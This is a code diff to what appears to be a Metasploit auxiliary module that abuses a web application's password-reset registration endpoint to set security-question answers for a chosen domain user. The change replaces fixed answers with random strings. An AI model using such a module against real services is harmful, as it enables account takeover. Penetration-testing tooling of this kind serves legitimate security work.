@@ -116,6 +116,7 @@ class Metasploit4 < Msf::Auxiliary
 
     full_user = "#{domain}\\#{localuser}"
     vprint_status("#{peer}: sending password reset request for #{full_user}")
+    answers = [ Rex::Text.rand_text_alpha(8), Rex::Text.rand_text_alpha(8) ]
     res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, 'PasswordReset', 'Application', 'Register'),
       'method' => 'POST',
@@ -124,14 +125,14 @@ class Metasploit4 < Msf::Auxiliary
         'domainname' => domain,
         'userName' => localuser,
         'emailaddress' => Rex::Text.rand_text_alpha(8) + '@' + Rex::Text.rand_text_alpha(8) + '.com',
-        'userQuestions' => '[{"Id":1,"Answer":"not"},{"Id":2,"Answer":"not"}]',
+        'userQuestions' => %Q([{"Id":1,"Answer":"#{answers.first}"},{"Id":2,"Answer":"#{answers.last}"}]),
         'updatequesChk' => 'false',
         'SelectedQuestion' => 1,
         'SelectedQuestion' => 2,
-        'answer' => 'not',
-        'answer' => 'not',
-        'confirmanswer' => 'not',
-        'confirmanswer' => 'not'
+        'answer' => answers.first,
+        'answer' => answers.last,
+        'confirmanswer' => answers.first,
+        'confirmanswer' => answers.last
       }
     )
 
